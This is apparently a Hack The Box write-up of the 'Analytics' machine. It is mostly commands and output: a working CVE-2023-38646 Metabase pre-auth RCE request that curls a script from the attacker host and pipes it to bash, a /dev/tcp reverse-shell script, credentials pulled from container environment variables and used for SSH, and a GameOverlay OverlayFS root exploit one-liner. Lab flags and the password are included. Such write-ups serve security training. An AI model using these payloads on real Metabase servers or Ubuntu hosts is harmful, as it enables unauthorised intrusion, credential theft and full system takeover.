## About Analytics
Analytics is an easy difficulty Linux machine with exposed HTTP and SSH services. Enumeration of the website reveals a `Metabase` instance, which is vulnerable to Pre-Authentication Remote Code Execution (`[CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)`), which is leveraged to gain a foothold inside a Docker container. Enumerating the Docker container we see that the environment variables set contain credentials that can be used to SSH into the host. Post-exploitation enumeration reveals that the kernel version that is running on the host is vulnerable to `GameOverlay`, which is leveraged to obtain root privileges.

I began my enumeration with a basic service/version scan against the target:


```bash
 nmap -sV 10.129.229.224
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-21 14:08 CDT
Nmap scan report for 10.129.229.224
Host is up (0.082s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.51 seconds
```

Only ports 22 (SSH) and 80 (HTTP) were open.



I followed up with a more detailed scan targeting the discovered ports:


```bash 
nmap -sCV -p22,80 10.129.229.224
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-22 07:15 CDT
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 07:16 (0:00:06 remaining)
Nmap scan report for 10.129.229.224
Host is up (0.0080s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds
```a

Given the redirect, I performed a vhost scan using Gobuster:

```bash
gobuster vhost -u http://analytical.htb:80  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://analytical.htb:80
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: data.analytical.htb:80 Status: 200 [Size: 77883]
Progress: 114441 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```
> Discovery: data.analytical.htb
> 
I browsed to http://data.analytical.htb and identified the service as Metabase. To confirm the version:

```bash
curl -s http://data.analytical.htb/api/session/properties | jq '.version'
{
  "date": "2023-06-29",
  "tag": "v0.46.6",
  "branch": "release-x.46.x",
  "hash": "1bb88f5"
}

```
This version is vulnerable to CVE-2023-38646, which allows unauthenticated remote code execution.


> Description
>Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1 allow attackers to execute arbitrary commands on the server, at the server's privilege level. Authentication is not required for exploitation.

Then I retrieved the setup token:

```bash
curl -s http://data.analytical.htb/api/session/properties | jq -r '.["setup-token"]'
249fa03d-fd94-4d5b-b94f-b4ebf3df681f
```
I prepared a simple reverse shell:

```bash
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.126/8888 0>&1' > rev.sh

 python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...

```


Then, using Burp Suite, I crafted the following malicious POST request to trigger RCE:


```h
POST /api/setup/validate HTTP/1.1
Host: data.analytical.htb
Content-Type: application/json
Content-Length: 783

{
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
                        "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {curl,10.10.14.126:8081/rev.sh}|bash')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}

```
As soon as I send the post request I obtained the reverse shell as the user metabase.
```bash
listening on [any] 8888 ...
connect to [10.10.14.126] from (UNKNOWN) [10.129.229.224] 44056
sh: can't access tty; job control turned off
/ $ whoami
metabase
/ $ 
```
While exploring the environment variables, I found credentials:

```bash
/ $ env
MB_LDAP_BIND_DN=
LANGUAGE=en_US:en
USER=metabase
HOSTNAME=bedd46381734
FC_LANG=en-US
SHLVL=4
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
HOME=/home/metabase
MB_EMAIL_SMTP_PASSWORD=
LC_CTYPE=en_US.UTF-8
JAVA_VERSION=jdk-11.0.19+7
LOGNAME=metabase
_=whoami
MB_DB_CONNECTION_URI=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_PASS=
MB_JETTY_HOST=0.0.0.0
META_PASS=An4lytics_ds20223#
LANG=en_US.UTF-8
MB_LDAP_PASSWORD=
SHELL=/bin/sh
MB_EMAIL_SMTP_USERNAME=
MB_DB_USER=
META_USER=metalytics
LC_ALL=en_US.UTF-8
JAVA_HOME=/opt/java/openjdk
PWD=/
MB_DB_FILE=//metabase.db/metabase.db
```
Using the credentials found, I successfully SSH'd into the box:

```bash

ssh metalytics@10.129.229.224 

```

### User flag:


```bash
metalytics@analytics:~$ cat user.txt
435a95bcf16c627c8d9e841640cfefa5
```
I checked system version info:


```bash
metalytics@analytics:~$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

```bash
metalytics@analytics:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 22.04.3 LTS
Release:	22.04
Codename:	jammy
```


This kernel is vulnerable to OverlayFS-based privilege escalation (unprivileged user namespace enabled + setcap support).

I crafted a local root exploit:


```bash
metalytics@analytics:~$ nano shell.sh
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o
rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import
os;os.setuid(0);os.system("/bin/bash")'
```
Then: 
```bash
metalytics@analytics:~$ chmod +x shell.sh
metalytics@analytics:~$ ./shell.sh
```

 I got a root shell.
```bash
root@analytics:/root# cat /root/root.txt
fd82c29e675087eb6017ab6b571dd97a
```

